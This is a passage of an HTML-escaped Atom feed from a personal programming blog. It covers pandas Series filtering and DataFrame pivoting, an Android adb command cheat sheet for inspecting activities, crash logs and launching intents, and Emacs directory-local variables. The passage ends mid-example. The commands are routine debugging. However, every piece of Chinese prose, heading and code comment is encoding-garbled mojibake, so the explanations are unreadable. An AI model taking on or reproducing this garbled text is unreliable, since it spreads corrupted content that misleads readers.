&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¿™é‡Œ costs æ˜¯ä¸€ä¸ª Series&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Series æ”¯æŒ filter, min ç­‰æ“ä½œï¼Œä¹Ÿæ”¯æŒ costs[&amp;#39;10.11.10&amp;#39;] è¿™ç§æŒ‰ key å–å€¼çš„æ“ä½œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filtered_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">filter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">lambda&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">math&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">isnan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">costs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="pivot-é€è§†æ—‹è½¬">Pivot é€è§†ï¼ˆæ—‹è½¬ï¼‰&lt;/h2>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/cb195428-ef26-4d37-87a8-95e593e1743b/Untitled.png" alt="">&lt;/p>
&lt;p>&lt;a href="https://pandas.pydata.org/docs/user_guide/reshaping.html">https://pandas.pydata.org/docs/user_guide/reshaping.html&lt;/a>&lt;/p>
&lt;h3 id="æ¡ˆä¾‹å°†-app_version_name-çš„æ¯é¡¹å–å€¼è½¬ç½®ä¸ºåˆ—å">æ¡ˆä¾‹ï¼šå°† app_version_name çš„æ¯é¡¹å–å€¼ï¼Œè½¬ç½®ä¸ºåˆ—å&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># name + type ä¸º keyï¼Œå°† app_version_name è¿™ä¸€åˆ—çš„æ¯ä¸ªå€¼ï¼Œæ‹†åˆ†ä¸ºåˆ—å&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">df&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">df&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pivot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">columns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;app_version_name&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;cost&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å˜æ¢å‰ï¼š&lt;/p>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/d1d7bf1e-c912-4cac-963b-748f8f3936b7/Untitled.png" alt="">&lt;/p>
&lt;p>å˜æ¢åï¼š&lt;/p>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/a559b5cd-4102-4609-8ae4-6ddfdef70eef/Untitled.png" alt="">&lt;/p></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/data-analysis/" term="Data-Analysis" label="Data-Analysis"/><category scheme="https://mincodes.com/tags/python/" term="Python" label="Python"/></entry><entry><title type="text">Android Tools</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/android-tools/"/><id>https://mincodes.com/posts/android-tools/</id><updated>2023-02-05T10:44:00+00:00</updated><published>2022-06-27T06:19:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å¸¸ç”¨å·¥å…· scrcpyï¼šPC ç«¯é•œåƒæ‰‹æœºç«¯å±å¹•ï¼Œå¯æ“ä½œã€æˆªå±ã€å½•å±ç­‰ UI åˆ†æå·¥å…· codeLocatorï¼šå®â€¦</summary><content type="html">&lt;h2 id="å¸¸ç”¨å·¥å…·">å¸¸ç”¨å·¥å…·&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>scrcpyï¼šPC ç«¯é•œåƒæ‰‹æœºç«¯å±å¹•ï¼Œå¯æ“ä½œã€æˆªå±ã€å½•å±ç­‰&lt;/p>
&lt;/li>
&lt;li>
&lt;p>UI åˆ†æå·¥å…·&lt;/p>
&lt;ul>
&lt;li>codeLocatorï¼šå®æ—¶æŠ“å– viewTree&lt;/li>
&lt;li>Android Studioï¼šAndroid Device Monitor&lt;/li>
&lt;li>UIAutomatorViewer&lt;/li>
&lt;li>Appium Inspector&lt;/li>
&lt;li>Espresso&lt;/li>
&lt;li>adb&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://github.com/facebook/flipper">flipper&lt;/a>ï¼šA desktop debugging platform for mobile developers.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="adb-å‘½ä»¤å¤‡å¿˜">adb å‘½ä»¤å¤‡å¿˜&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æŸ¥çœ‹å½“å‰&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Activity&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ˜¯å¦ä½¿ç”¨äº†&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SurfaceView&lt;/span>&lt;span class="err">ã€‚å¦‚æœæœ‰&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SurfaceView&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">å­—æ ·ï¼Œåˆ™è¡¨ç¤ºä½¿ç”¨äº†&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SurfaceView&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dumpsys&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SurfaceFlinger&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">grep&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;HWC layers&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">A10&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æŸ¥çœ‹æœ€è¿‘çš„&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">crash&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ—¥å¿—&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">logcat&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">crash&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æŸ¥çœ‹å½“å‰&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Activity&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dumpsys&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">activity&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">grep&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ACTIVITY&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æŸ¥çœ‹å½“å‰è·å¾—ç„¦ç‚¹çš„&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Window&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ‰€åœ¨çš„&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Activity&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">dumpsys&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">window&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">grep&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mCurrentFocus&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">é€šè¿‡&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Action&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">éšå¼æ‹‰èµ·é¡µé¢ï¼Œä¾‹å¦‚é€šè¿‡&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">schema&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ‹‰èµ·é¡µé¢&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">am&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">start&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">intent&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">action&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">VIEW&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;kwai://live/play/RZA8aukYCco&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">é€šè¿‡&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">åŒ…å&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="err">ç»„ä»¶å&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">æ˜¾ç¤ºæ‹‰èµ·é¡µé¢&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">am&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">start&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">camera&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">camera&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Camera&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">adb&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">am&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">start&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">browser&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">BrowserActivity&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/android/" term="Android" label="Android"/></entry><entry><title type="text">Emacs çš„æœ¬åœ°å˜é‡ (Local Variables)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/emacs-local-variables/"/><id>https://mincodes.com/posts/emacs-local-variables/</id><updated>2024-03-20T09:34:26+00:00</updated><published>2022-03-12T00:00:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Emacs ä¸­çš„å˜é‡ è¦è§£é‡Šæœ¬åœ°å˜é‡ï¼Œå…ˆè§£é‡Šä¸€ä¸‹ Emacs é‡Œé¢å˜é‡çš„ä½œç”¨ã€‚ Emacs ä¸­æœ‰å¾ˆå¤šåŠŸèƒ½ï¼ˆå†…ç½®çš„æˆ–è€…æ’ä»¶æä¾›çš„ï¼‰éƒ½å¯ä»¥é€šâ€¦</summary><content type="html">&lt;h2 id="emacs-ä¸­çš„å˜é‡">Emacs ä¸­çš„å˜é‡&lt;/h2>
&lt;p>è¦è§£é‡Šæœ¬åœ°å˜é‡ï¼Œå…ˆè§£é‡Šä¸€ä¸‹ Emacs é‡Œé¢å˜é‡çš„ä½œç”¨ã€‚&lt;/p>
&lt;p>Emacs ä¸­æœ‰å¾ˆå¤šåŠŸèƒ½ï¼ˆå†…ç½®çš„æˆ–è€…æ’ä»¶æä¾›çš„ï¼‰éƒ½å¯ä»¥é€šè¿‡è®¾ç½®ä¸€äº›å˜é‡çš„å€¼æ¥
è¿›è¡Œä¸€äº›ä¸ªæ€§åŒ–çš„å®šåˆ¶ã€‚&lt;/p>
&lt;p>è¿™é‡Œä¸¾å‡ ä¸ªä¾‹å­åŠ ä»¥è¯´æ˜ï¼š&lt;/p>
&lt;dl>
&lt;dt>indent-tabs-mode&lt;/dt>
&lt;dd>æ˜¯å¦ä½¿ç”¨ tabæ¥åšç¼©è¿›&lt;/dd>
&lt;dt>fill-column&lt;/dt>
&lt;dd>è®¾ç½®è‡ªåŠ¨æ¢è¡Œçš„é•¿åº¦ï¼Œé»˜è®¤ 70&lt;/dd>
&lt;dt>org-download-image-dir&lt;/dt>
&lt;dd>è®¾ç½® org-download æ’ä»¶ç”¨æ¥å­˜å‚¨å›¾ç‰‡çš„è·¯å¾„ï¼Œ
é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨ç›®å½•&lt;/dd>
&lt;dt>org-confirm-babel-evaluate&lt;/dt>
&lt;dd>è®¾ç½® babel æ‰§è¡Œä»£ç æ—¶æ˜¯å¦éœ€è¦ç¡®è®¤&lt;/dd>
&lt;/dl>
&lt;p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ &lt;code>.emacs&lt;/code> æ–‡ä»¶ä¸­å¯¹è¿™äº›å˜é‡è¿›è¡Œå…¨å±€é…ç½®ã€‚ä½†å¦‚
æœä½ æœ‰è¿›ä¸€æ­¥çš„è¯‰æ±‚ï¼Œä¾‹å¦‚å¸Œæœ›é’ˆå¯¹æŸä¸ªé¡¹ç›®ï¼ˆæˆ–è€…æŸä¸ªç›®å½•ï¼‰æœ‰ä¸€äº›ä¸åŒçš„å®š
åˆ¶ï¼Œæˆ–è€…ç”šè‡³å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡Œå•ç‹¬çš„é…ç½®å‘¢ï¼Ÿ&lt;/p>
&lt;p>è¿™æ—¶å€™ Local Variables å°±æ´¾ä¸Šç”¨åœºäº†ã€‚&lt;/p>
&lt;p>ç®€å•æ¥è¯´ï¼Œä½ å¯ä»¥æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š&lt;/p>
&lt;dl>
&lt;dt>directory-local variables&lt;/dt>
&lt;dd>åœ¨ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå« &lt;code>.dir-locals.el&lt;/code> çš„æ–‡ä»¶ï¼Œè¯¥ç›®å½•ä¸‹ï¼ˆä»¥åŠå­ç›®å½•ä¸‹ï¼‰
çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šåº”ç”¨è¯¥æ–‡ä»¶çš„é…ç½®ã€‚å‡ºäºæ€§èƒ½è€ƒè™‘ï¼Œè¿œç¨‹æ–‡ä»¶é»˜è®¤ä¸å¼€å¯çˆ¶ç›®
å½•æœç´¢åŠŸèƒ½ã€‚&lt;/dd>
&lt;dt>file-local variables&lt;/dt>
&lt;dd>å¯ä»¥åœ¨æ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œæˆ–è€…æ–‡ä»¶æœ«å°¾å¤„å®šä¹‰ï¼Œä»…å¯¹è¯¥æ–‡ä»¶æœ‰æ•ˆï¼Œå…·ä½“å¦‚ä½•å®šä¹‰
åæ–‡æœ‰ä»‹ç»ã€‚é’ˆå¯¹åŒä¸€ä¸ªå˜é‡ï¼Œfile-local ä¼šè¦†ç›– directory-local çš„å®šä¹‰ã€‚&lt;/dd>
&lt;/dl>
&lt;h2 id="directory-local-variables-æœ¬åœ°ç›®å½•å˜é‡">directory-local variables æœ¬åœ°ç›®å½•å˜é‡&lt;/h2>
&lt;p>é™¤äº† &lt;code>.dir-locals.el&lt;/code> æ–‡ä»¶ï¼Œè¿˜å¯ä»¥å®šä¹‰é¢å¤–çš„ &lt;code>.dir-locals-2.el&lt;/code> æ–‡ä»¶ã€‚
å½“ &lt;code>.dir-locals.el&lt;/code> æ–‡ä»¶åœ¨ git ä»“åº“ä¸­ä½œä¸ºå…±äº«æ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿™ç¬¬äºŒä¸ª
æ–‡ä»¶æ¥è¿›è¡Œä¸€äº›æœ¬åœ°åŒ–é…ç½®ã€‚&lt;/p>
&lt;p>&lt;code>.dir-locals.el&lt;/code> æ–‡ä»¶ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¿™äº›é…ç½®ä¼šåº”ç”¨åˆ°ä»»æ„æ¨¡å¼ï¼ˆå³æ‰€æœ‰æ–‡ä»¶ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="no">nil&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">indent-tabs-mode&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="no">t&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">fill-column&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">mode&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">auto-fill&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¿™äº›é…ç½®åªä¼šåº”ç”¨åˆ° c-mode çš„æ–‡ä»¶ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">c-mode&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">c-file-style&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s">&amp;#34;BSD&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; ä¸‹é¢è¿™å¥æŒ‡å®šè¯¥é…ç½®ä»…åº”ç”¨åˆ°å½“å‰ç›®å½•ï¼Œä¸åº”ç”¨åˆ°å­ç›®å½•&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">subdirs&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="no">nil&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¿™äº›é…ç½®åªä¼šåº”ç”¨åˆ° org æ–‡ä»¶ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">org-mode&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">org-download-image-dir&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s">&amp;#34;./images&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; è¿™äº›é…ç½®ä¼šåº”ç”¨åˆ° src/imported ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;src/imported&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="no">nil&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">change-log-default-name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">.&lt;/span> &lt;span class="s">&amp;#34;ChangeLog.local&amp;#34;&lt;/span>&lt;span class="p">))))))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦ä¸€ç§é…ç½® directory-local variables çš„æ–¹å¼ï¼Œæ˜¯å®šä¹‰ä¸€ä¸ª &lt;code>directory class&lt;/code>, ç„¶åæŒ‡å®šæŸä¸ªç›®å½•ä½¿ç”¨è¯¥ &lt;code>directory class&lt;/code> ã€‚ä¸¾ä¾‹è¯´æ˜ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nv">dir-locals-set-class-variables&lt;/span> &lt;span class="ss">&amp;#39;unwritable-directory&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;#39;&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="no">nil&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">some-useful-setting&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">value&lt;/span>&lt;span class="p">)))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nv">dir-locals-set-directory-class&lt;/span>
